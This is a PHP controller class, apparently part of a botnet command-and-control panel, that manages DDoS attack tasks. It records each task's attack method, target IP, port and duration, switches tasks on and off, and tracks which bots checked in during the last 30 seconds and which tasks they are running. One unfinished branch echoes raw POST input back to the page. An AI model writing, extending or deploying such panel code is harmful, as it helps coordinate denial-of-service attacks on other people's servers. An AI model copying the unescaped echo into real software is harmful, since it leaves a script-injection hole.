<?php

class ddosController{

    public function __construct()
    {
        $GLOBALS["template"][0] = get_plugin_base_dir("ddos") . "/template/ddos";
    }

    public function ddoshub()
    {
        $GLOBALS["template"][1] = "ddoshub";




        if(!empty($_POST["load-ddosBots"])){

            echo $_POST["load-ddosBots"];

            die("TOdo Begin Loading task");
        }

        if(!empty($_POST["method"])){
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status) VALUES (?, ?, ?, ?, ?)");
            $statement->execute(array($_POST["method"], $_POST["targetip"],$_POST["maxtime"],  $_POST["targetport"], "active"));
        }

        if(!empty($_POST["changeTask"])){
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE id = ?");
            $statement->execute(array($_POST["changeTask"]));
            $details = $statement->fetch();
            $status ='active';
            if($details["status"] == "active"){
                $status ='none';
            }
            $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET status = ? WHERE id = ?");
            $statement->execute(array($status, $_POST["changeTask"]));
            Header("Refresh:0;");
        }

        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
        $statement->execute(array(time()-30));
        $bots = array();
        while($row = $statement->fetch()) {
            $bots[] = $row;
        }


        $statement = $GLOBALS["pdo"]->prepare("SELECT count(ddos_avalible.id) as workingon,ddos_tasks.* FROM ddos_tasks 
                                                LEFT JOIN ddos_avalible on ddos_tasks.id = ddos_avalible.ddos_taskid");
        $statement->execute(array(time()-30));
        $tasks = array();
        while($row = $statement->fetch()) {
            $tasks[] = $row;
        }

        $GLOBALS["tpl"]->assign("bots_count",count($bots));
        $GLOBALS["tpl"]->assign("bots",$bots);
        $GLOBALS["tpl"]->assign("tasks",$tasks);
    }

}